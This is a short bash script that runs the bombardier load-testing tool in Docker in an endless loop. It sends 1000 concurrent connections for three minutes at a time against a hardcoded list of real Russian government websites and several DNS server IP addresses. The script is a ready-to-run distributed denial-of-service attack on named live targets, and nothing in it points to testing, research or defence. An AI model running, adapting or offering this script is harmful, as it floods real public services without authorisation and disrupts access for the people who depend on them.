#!/bin/bash -x
DESTS=( "http://duma.gov.ru/" "http://president-sovet.ru/" "https://sovetnational.ru/" "https://www.gosuslugi.ru/ru/" "https://zakupki.gov.ru/epz/main/public/home.html" "https://gossluzhba.gov.ru/" "http://defence.council.gov.ru/" "http://budget.council.gov.ru/" "http://www.kremlin.ru/" "https://government.ru/" "http://www.scrf.gov.ru/" "http://www.ksrf.ru/ru/Pages/default.aspx" "http://www.vsrf.ru/" "http://premier.gov.ru/events/" "https://www.mchs.gov.ru/" "https://minjust.gov.ru/ru/" "http://www.fsb.ru/" "https://rosguard.gov.ru/" "https://customs.gov.ru/" "https://udprf.ru/" "http://favt.gov.ru/" "http://194.67.2.109:53/UDP" "http://194.67.7.1:53/UDP" "http://194.54.14.187:53/UDP" "http://194.54.14.186:53/UDP" )
TIME="180s"
while true
do
   for DEST in ${DESTS[@]}
   do
       docker run -ti --rm alpine/bombardier -c 1000 -d $TIME -l $DEST
   done
done